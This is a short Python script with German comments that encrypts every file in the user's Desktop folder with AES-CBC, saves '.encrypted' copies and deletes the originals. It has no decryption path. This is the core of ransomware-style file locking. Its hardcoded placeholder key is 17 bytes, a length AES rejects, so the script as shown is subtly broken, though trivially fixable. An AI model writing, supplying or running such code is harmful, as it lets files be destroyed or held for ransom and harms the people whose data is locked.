import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import shutil

def encrypt_file(file_path, key):
    # Generiere einen zufälligen Initialisierungsvektor
    iv = get_random_bytes(AES.block_size)

    # Erstelle einen AES-Verschlüsselungsobjekt
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Lese den Inhalt der Datei
    with open(file_path, 'rb') as file:
        file_data = file.read()

    # Passe die Dateigröße auf ein Vielfaches der Blockgröße an
    padded_data = pad(file_data, AES.block_size)

    # Verschlüssele die Dateidaten
    encrypted_data = cipher.encrypt(padded_data)

    # Erstelle den neuen Dateinamen für die verschlüsselte Datei
    encrypted_file_path = file_path + '.encrypted'

    # Schreibe die verschlüsselten Daten in eine neue Datei
    with open(encrypted_file_path, 'wb') as file:
        file.write(iv + encrypted_data)

    # Lösche die Originaldatei
    os.remove(file_path)

def encrypt_files_on_desktop(key):
    desktop_path = os.path.expanduser("~/Desktop")

    for filename in os.listdir(desktop_path):
        file_path = os.path.join(desktop_path, filename)

        if os.path.isfile(file_path) and not filename.endswith('.encrypted'):
            encrypt_file(file_path, key)

# Hauptprogramm
password = b'YourEncryptionKey'  # Hier dein Verschlüsselungsschlüssel

encrypt_files_on_desktop(password)

